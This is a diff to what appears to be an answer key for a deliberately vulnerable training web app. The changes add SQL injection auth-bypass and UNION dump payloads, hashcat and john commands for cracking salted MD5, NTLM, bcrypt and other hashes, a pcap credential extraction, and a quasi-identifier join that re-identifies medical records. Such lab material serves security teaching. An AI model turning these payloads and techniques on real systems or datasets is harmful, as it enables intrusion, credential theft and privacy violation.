@@ -25,11 +25,22 @@ Try each vuln yourself first (checklist Phase 0 → detect → exploit). `U=http
 ```
 # auth bypass:
 curl -s "$U/login.php" --data-urlencode "username=admin'-- -" --data-urlencode "password=x"
-# dump all users via UNION (3 columns to match the SELECT):
-curl -sG "$U/index.php" --data-urlencode "q=zzz%' UNION SELECT username,password,role FROM users-- -"
+# dump all users via UNION on the directory search (3 cols: username,email,role) — passwords are now
+# SALTED MD5, so pull the salt too (pack hash:salt into the middle/"email" column):
+curl -sG "$U/home.php" --data-urlencode "q=' UNION SELECT username,CONCAT(password,0x3a,salt),role FROM users-- -"
 ```
-**Result:** logs in as admin → `FLAG{sql1_auth_byp4ss_and_1dor}`; UNION lists `admin:S3ntinel!Admin`, `alice:password123`, …
-**Reason:** `"...WHERE username='$u' AND password='$p'"` — `admin'-- -` closes the string and comments out the password check; the search column count (3) matches so the UNION rows render.
+**Result:** auth bypass logs in as admin → `FLAG{sql1_auth_byp4ss_and_1dor}` directly (no cracking needed).
+The UNION now dumps `admin:7cc3c50b…:a7Fk2`, `alice:6cb1f927…:Lm9xQ`, … (`hash:salt`). Crack them:
+```
+# one hash:salt per line in hashes.txt, then md5(pass.salt) = hashcat mode 10:
+hashcat -m 10 hashes.txt /usr/share/wordlists/rockyou.txt
+# -> alice=password123, bob=letmein  (admin='S3ntinel!Admin' won't crack from rockyou,
+#    but it's leaked in config.php.bak — see #9 — and the auth bypass above skips cracking entirely)
+```
+**Reason:** `"...WHERE username='$u' AND password=MD5(CONCAT('$p',salt))"` — `admin'-- -` closes the
+string and comments out the whole password check, so the bypass is unaffected by the salting; the search
+column count (3) matches so the UNION rows render. Salting only changes the *dump→crack* path: you must
+dump each user's salt and crack per-hash — it does nothing against the injection or weak passwords.
 
 ## 2. Reflected XSS  (`index.php?q=`)
 **Answer:** `q` is echoed into the HTML unencoded.
@@ -190,4 +201,10 @@ from it; protect sensitive paths with auth (not `robots.txt`); rotate the expose
 - **network/*.pcap** → `tshark -r http_login_cleartext.pcap -z follow,tcp,ascii,0 -q` → `username=admin&password=S3ntinel!Admin`.
 - **data/kpi_audit.db** → `sqlite3 kpi_audit.db "SELECT COUNT(DISTINCT user_id) FROM sessions WHERE substr(started_at,1,10)='2026-06-30'"` ≈ 130 vs claimed 24500 (overstated); exclude out-of-window July rows + decoy models/internal users.
 - **data/medical_release.csv + voter_list.csv** → join on age+zip+gender: rows unique on those 3 quasi-identifiers (e.g. age 29/zip 8001/F appears >1 but 55/3011/M links to one name) → re-identify.
-- **hashes/** → `hashid`/`hash-identifier`, then `john --wordlist=rockyou.txt`: md5→password, sha1→dragon, apr1→summer, sha512→hunter2.
+- **hashes/** → identify first (`hashid '<hash>'` / `hash-identifier`), then crack with the matching mode
+  (`hashcat -m <n>` or `john --format=<fmt> --wordlist=rockyou.txt`):
+  `md5.txt` -m 0 →password · `sha1.txt` -m 100 →dragon · `sha256.txt` -m 1400 →princess ·
+  `md5_salted.txt` -m 10 (`hash:salt`) →baseball · `ntlm.txt` -m 1000 →welcome ·
+  `bcrypt.txt` -m 3200 →football (slow — bcrypt's work factor) · `apr1_htpasswd.txt` -m 1600 →summer ·
+  `sha512_shadow.txt` -m 1800 →hunter2. `mystery.txt` = 4 **unlabeled** hashes — identify each yourself
+  (md5→monkey, sha256→iloveyou, ntlm→sunshine, sha1→superman).
